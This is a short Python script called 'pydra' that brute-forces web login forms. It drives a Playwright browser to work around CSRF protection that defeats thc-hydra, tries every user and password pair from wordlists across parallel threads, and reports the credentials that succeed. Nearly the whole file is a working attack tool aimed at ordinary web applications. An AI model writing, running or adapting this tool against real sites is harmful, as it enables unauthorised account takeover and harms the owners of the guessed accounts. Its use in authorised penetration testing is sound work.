"""
Script that does user password bruteforcing from a wordlist.
Originally I was trying to do it with thc-hydra, however,
that tool does not work with CSRF protection.
This tool makes the attempts from the browser itself by using
playwright, thereforece there are no CSRF issues.
"""

import argparse
from concurrent.futures import ThreadPoolExecutor
from playwright.sync_api import sync_playwright


def debug(msg, args):
    """
    prints a debug message if verbose option is passed
    """
    if args.verbose:
        print(msg)


def login_attempt(executor_args):
    """
    attemps a login attempt with the passed user, password.
    It starts a new browser for each login attempt.
    """
    user, password, args = executor_args
    debug(f"logging attempt with {user} and {password}", args)
    with sync_playwright() as play_wright:
        browser = play_wright.chromium.launch(headless=not args.show_browser)
        page = browser.new_page()
        page.goto(args.login_form_url)
        page.wait_for_url(args.login_form_url)
        page.wait_for_selector(args.user_selector)
        page.wait_for_selector(args.passwd_selector)
        page.locator(args.user_selector).fill(user)
        page.locator(args.passwd_selector).fill(password)
        page.locator(args.button_selector).click()
        try:
            page.wait_for_selector(args.incorrect_selector, timeout=1000)
            return False
        except Exception:
            print(f"Login successful with {user} and {password}")
            return True
        finally:
            browser.close()


def get_args():
    """
    parses the cli arguments
    """
    parser = argparse.ArgumentParser(
        prog='pydra',
        description='pydra does username/password brute force cracking using \
                    user/password list from the browser to avoid CSRF protection')

    parser.add_argument('--login-form-url', required=True)
    parser.add_argument('--user-list', required=True)
    parser.add_argument('--passwd-list', required=True)
    parser.add_argument('--user-selector', required=True)
    parser.add_argument('--passwd-selector', required=True)
    parser.add_argument('--button-selector', required=True)
    parser.add_argument('--incorrect-selector', required=True)
    parser.add_argument('--show-browser', action="store_true")
    parser.add_argument('--verbose', action="store_true")
    parser.add_argument('--threads', type=int, default=4)

    return parser.parse_args()


def load_word_list(word_list_file):
    """
    load a word list
    """
    with open(word_list_file, 'r', encoding='utf-8') as wlf:
        lines = wlf.readlines()
        return [line.rstrip() for line in lines]


def brute_force():
    """
    performs the brute force attack with a pool of threads
    """
    args = get_args()
    users = load_word_list(args.user_list)
    passwords = load_word_list(args.passwd_list)
    executor = ThreadPoolExecutor(max_workers=args.threads)
    attemps = []
    for user in users:
        for password in passwords:
            attemps.append([user, password, args])
    results = executor.map(login_attempt, attemps)
    for found in results:
        if found:
            debug("Shutting down ...", args)
            executor.shutdown(cancel_futures=True)
            break


if __name__ == '__main__':
    brute_force()
